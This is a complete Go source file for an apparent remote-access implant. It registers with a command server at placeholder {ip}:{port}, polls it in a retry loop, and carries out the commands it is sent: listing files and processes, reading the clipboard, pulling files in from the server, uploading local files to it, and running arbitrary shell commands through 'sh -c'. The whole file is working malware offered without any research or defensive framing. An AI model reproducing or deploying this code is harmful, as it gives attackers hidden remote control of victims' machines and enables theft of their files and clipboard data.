package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/atotto/clipboard"
	"github.com/google/uuid"
)

const (
	ip         = "{ip}"
	port       = "{port}"
	serverURL  = "http://" + ip + ":" + port + "/client"
	timeout    = 30 * time.Second
	retryDelay = 300 * time.Second
)

var clientUUID = uuid.New().String()

func main() {
	fmt.Println("Client UUID:", clientUUID)

	err := registerClient()
	if err != nil {
		fmt.Println("Failed to register with server:", err)
		return
	}

	retryCount := 0
	maxRetry := 10
	for {
		err := pollServer()
		if err != nil {
			fmt.Println("Error polling server:", err)
			retryCount++
			if retryCount > maxRetry {
				fmt.Println("Max retries reached. Re-registering client...")
				retryCount = 0
				registerClient()
			}
			time.Sleep(retryDelay)
		} else {
			retryCount = 0
		}
	}
}

func registerClient() error {
	req, err := http.NewRequest("POST", serverURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("UUID", clientUUID)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to register: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("failed to register with server: %d - %s", resp.StatusCode, string(body))
	}

	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println("Register Response:", string(body))
	return nil
}

func pollServer() error {
	client := &http.Client{Timeout: timeout}
	req, err := http.NewRequest("GET", serverURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("UUID", clientUUID)

	resp, err := client.Do(req)
	if err != nil {
		if strings.Contains(err.Error(), "context deadline exceeded") {
			fmt.Println("Request timeout, re-registering client...")
			return registerClient()
		}
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		if resp.StatusCode == http.StatusConflict {
			fmt.Println("UUID is not in sync, re-registering client...")
			return registerClient()
		}
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("server error: %d - %s", resp.StatusCode, string(body))
	}

	var serverData map[string]string
	err = json.NewDecoder(resp.Body).Decode(&serverData)
	if err != nil {
		return fmt.Errorf("failed to decode server response: %v", err)
	}

	fmt.Println("Server Response:", serverData)

	if command, ok := serverData["command"]; ok {
		result := handleCommand(command)
		fmt.Println("Command Result:", result)
		return sendResult(command, result)
	}
	return nil
}

func sendResult(command, result string) error {
	client := &http.Client{}
	data := map[string]string{
		"command": command,
		"result":  result,
	}
	jsonData, _ := json.Marshal(data)

	req, err := http.NewRequest("POST", serverURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("UUID", clientUUID)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func handleCommand(command string) string {
	switch {
	case command == "list_files":
		return listFiles()
	case command == "get_clipboard":
		return getClipboard()
	case strings.HasPrefix(command, "download_file "):
		parts := strings.SplitN(command, " ", 2)
		if len(parts) < 2 {
			return "Invalid download_file command"
		}
		return downloadFile(parts[1])
	case strings.HasPrefix(command, "upload_file "):
		parts := strings.SplitN(command, " ", 2)
		if len(parts) < 2 {
			return "Invalid upload_file command"
		}
		return uploadFile(parts[1])
	case strings.HasPrefix(command, "execute_command "):
		parts := strings.SplitN(command, " ", 2)
		if len(parts) < 2 {
			return "Invalid execute_command command"
		}
		return executeCommand(parts[1])
	case command == "list_processes":
		return listProcesses()
	default:
		return "Unknown command"
	}
}

func listFiles() string {
	files, err := ioutil.ReadDir(".")
	if err != nil {
		return "Error listing files: " + err.Error()
	}

	var fileNames []string
	for _, file := range files {
		fileNames = append(fileNames, file.Name())
	}
	return strings.Join(fileNames, "\n")
}

func getClipboard() string {
	content, err := clipboard.ReadAll()
	if err != nil {
		return "Error getting clipboard content: " + err.Error()
	}
	return content
}

func downloadFile(filePath string) string {
	url := fmt.Sprintf("%s/download?filename=%s", serverURL, filePath)
	resp, err := http.Get(url)
	if err != nil {
		return "Error downloading file: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Sprintf("Failed to download file. Status: %d, Response: %s", resp.StatusCode, string(body))
	}

	savePath := filepath.Base(filePath)
	out, err := os.Create(savePath)
	if err != nil {
		return "Error creating file: " + err.Error()
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return "Error saving file: " + err.Error()
	}

	return fmt.Sprintf("File downloaded successfully: %s", savePath)
}

func uploadFile(filePath string) string {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return fmt.Sprintf("Error: The file '%s' does not exist.", filePath)
	}

	url := serverURL + "/upload"

	file, err := os.Open(filePath)
	if err != nil {
		return "Error opening file: " + err.Error()
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filePath)
	if err != nil {
		return "Error creating form file: " + err.Error()
	}

	if _, err := io.Copy(part, file); err != nil {
		return "Error copying file content: " + err.Error()
	}

	if err := writer.Close(); err != nil {
		return "Error closing writer: " + err.Error()
	}

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return "Error creating request: " + err.Error()
	}

	req.Header.Set("UUID", clientUUID)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "Error uploading file: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "File uploaded successfully."
	}

	respBody, _ := io.ReadAll(resp.Body)
	return fmt.Sprintf("Failed to upload file. Status: %d, Response: %s", resp.StatusCode, string(respBody))
}

func executeCommand(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return "Error executing command: " + err.Error()
	}
	return string(out)
}

func listProcesses() string {
	out, err := exec.Command("ps", "-aux").Output()
	if err != nil {
		return "Error listing processes: " + err.Error()
	}
	return string(out)
}
